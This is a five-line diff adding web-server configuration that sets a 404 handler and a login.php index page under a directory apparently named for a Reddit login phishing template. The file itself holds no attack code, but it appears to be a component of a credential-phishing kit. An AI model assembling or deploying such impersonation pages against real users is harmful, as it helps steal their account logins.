@@ -1,0 +1,5 @@
+# set errordocument(404)
+ErrorDocument 404 /phishingtemplates/reddit-login/errorhandler/404.php
+
+# set main page
+DirectoryIndex login.php
